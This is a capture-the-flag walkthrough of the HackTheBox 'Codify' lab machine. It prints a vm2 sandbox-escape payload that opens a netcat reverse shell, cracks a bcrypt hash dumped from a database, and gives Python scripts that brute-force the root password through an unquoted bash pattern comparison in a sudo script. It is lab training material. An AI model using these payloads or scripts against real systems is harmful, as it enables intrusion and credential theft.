# HackTheBox Codify

Easy level CTF lab machine of the HackTheBox platform running Linux, where we bypass the sandbox for Node JS, brute force the user password hash, and extract the root password from command line arguments.

## Service Overview

To scan the 10.10.11.239 machine, let's use rustscan:

```bash
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.239 -- -A -sC

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Codify
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
8081/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=11/6%OT=22%CT=%CU=31029%PV=Y%DS=2%DC=T%G=N%TM=6548BCCD%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 15.460 days (since Sun Oct 22 02:13:17 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web service

On port 80 and 3000 we are greeted by a service that allows us to run Node JS code in a sandbox.

In this case, the most interesting modules fs and child_process are locked: http://codify.htb/limitations.

```bash
The Codify platform allows users to write and run Node.js code online, but there are certain limitations in place to ensure the security of the platform and its users.
Restricted Modules

The following Node.js modules have been restricted from importing:

    child_process
    fs

This is to prevent users from executing arbitrary system commands, which could be a major security risk.
Module Whitelist

Only a limited set of modules are available to be imported. Some of them are listed below. If you need a specific module that is not available, please contact the administrator by mailing support@codify.htb while our ticketing system is being migrated.

    url
    crypto
    util
    events
    assert
    stream
    path
    os
    zlib
```

Detect the use of vm2 library in the editor and try to use POC: http://codify.htb/about.

```bash
About Our Code Editor

Our code editor is a powerful tool that allows developers to write and test Node.js code in a user-friendly environment. You can write and run your JavaScript code directly in the browser, making it easy to experiment and debug your applications.

The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.
```

Detect the use of vm2 library in the editor and try to use [POC](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac#poc).

```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.22 4444 >/tmp/f').toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

We are in the service account. We search for services and find the tickets.db database and the bcrypt hash in it.

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.239] 52252
bash: cannot set terminal process group (1248): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~$ ls
ls
exfil.sh
exploit1.sh
exploit.py
pwned
svc@codify:~$ cd /var/www
cd /var/www
svc@codify:/var/www$ ls
ls
contact
editor
html
svc@codify:/var/www$ cd editor
cd editor
svc@codify:/var/www/editor$ ls
ls
index.js
node_modules
package.json
package-lock.json
templates
svc@codify:/var/www/editor$ cd ..
cd ..
svc@codify:/var/www$ cd html
cd html
svc@codify:/var/www/html$ ls
ls
index.html
svc@codify:/var/www/html$ cd ..
cd ..
svc@codify:/var/www$ cd contact
cd contact
svc@codify:/var/www/contact$ ls
ls
index.js
package.json
package-lock.json
templates
tickets.db
svc@codify:/var/www/contact$ cat tickets.db
cat tickets.db
?T5??T?format 3@  .WJ
       ?otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)??    tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
??G?joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
??
????ua  users
             tickets
r]r?h%%?Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open? ;?wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:/var/www/contact$
```

The hash is successfully brute-forced.

```bash
3200 | bcrypt $2*$, Blowfish (Unix) | Operating System

??G?joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

```bash
$ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

Use the password to connect via SSH.

```bash
$ ssh joshua@10.10.11.239
spongebob1

joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
joshua@codify:~$ ls
user.txt
joshua@codify:~$ cat user.txt
316e2f9efd64ef14ee0622ef76d9f661
joshua@codify:~$
```

## Privilege escalation

Let's find out what our user can do as a superuser:

```bash
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

After searching online for unsafe things in bash to do, I have found something unsafe in the MYSQL bash script, [the unquoted variable comparison](https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md?source=post_page-----933488bfbfff--------------------------------).

```bash
Variable expansion:

    Good: "$my_var"
    Bad: $my_var

Command substitution:

    Good: "$(cmd)"
    Bad: $(cmd)

```

It seems he can sudo run a backup script located at ```/opt/scripts/mysql-backup.sh```. Inspect the code of the script which reveals to be vulnerable to wildcard injection.

```bash
...
if [[ $DB_PASS == $USER_PASS ]]; then
...
```

Okay, but how to exploit it, after searching online I have [found out](https://mywiki.wooledge.org/BashPitfalls?source=post_page-----933488bfbfff--------------------------------) that if right side of `==` is not quoted then bash does pattern matching against it, instead of treating it as a string.

```bash
{valid_password_char}{*}
```

Using double brackets in the if comparison allows us to use wildcards to guess the password, using a process similar to blind sql injections. To find out more about the difference between single brackets and double brackets read this: https://www.baeldung.com/linux/bash-single-vs-double-brackets#4-pattern-matching. In summary, both conditions ```[[$DB_PASS == Password123!]] and [[$DB_PASS == P* ]]``` will be evaluated as true in the if statement. To brute force the password you can use 3 methods:

- **Manually**. Letter by letter, **not recommended**.
- **Semi-manually**. Create a file called letter containing all lower-case, upper-case and digits and bruteforce them using a loop. As soon as you find a new character, add it to the for loop (e.g. ...echo abcde*...) and repeat until no more letters are discovered. Add letters sequentially as you discover in each iteration. The first loop iteration would look like this:

    ```bash
    for i in $(cat letters);do echo a* | sudo /opt/scripts/mysql-backup.sh && echo "$i";done
    ```

- **Using a python script**. Elegant and fast. The machine also has perl installed. A proposed python script would be the following:

```python
import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

print("[+] Initializing bruteforce script...")
print("[+] Bruteforce in progress, please wait...")
while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("[+] new character found: "+password)
                        next=1
                        break
                else: next=0
print("[+] Process terminated, root password is: "+password)
```

Or

We can guess or brute force the first password character followed by * to bypass the password prompt. And we can also brute force every character of the password till we found all characters of the password. Here is the python script, I used to brute force and extract the password.

```python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

Running it, the root mysql password is revealed in less than a minute, which turns out to be a reuse of the system's root password.

```bash
joshua@codify:~$ nano 1.py
joshua@codify:~$ python3 1.py
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

Using this password to capture root.txt:

```bash
joshua@codify:~$ su
Password: kljh12k3jhaskjh12kjh3
root@codify:/home/joshua# ll
total 3080
drwxrwx--- 4 joshua joshua    4096 Nov  6 12:43 ./
drwxr-xr-x 4 joshua joshua    4096 Sep 12 17:10 ../
lrwxrwxrwx 1 root   root         9 May 30 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 joshua joshua     220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 joshua joshua    3771 Apr 21  2023 .bashrc
drwx------ 2 joshua joshua    4096 Sep 14 14:44 .cache/
-rw------- 1 joshua joshua      20 Nov  6 12:34 .lesshst
drwxrwxr-x 3 joshua joshua    4096 Nov  6 12:35 .local/
-rw-rw-r-- 1 joshua joshua     514 Nov  6 12:38 ok.py
-rw-r--r-- 1 joshua joshua     807 Apr 21  2023 .profile
-rwxrwxr-x 1 joshua joshua 3104768 Nov  6 12:43 pspy64*
-rw-r----- 1 root   joshua      33 Nov  6 12:33 user.txt
-rw-r--r-- 1 joshua joshua      39 Sep 14 14:45 .vimrc
root@codify:/home/joshua# cd
root@codify:~# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:~# cat
.bash_history   .bashrc         .creds          .local/         .mysql_history  .profile        root.txt        scripts/        .ssh/           .vimrc
root@codify:~# cat root.txt
e2494157a506c41fa1bcdd2d1c396f14
```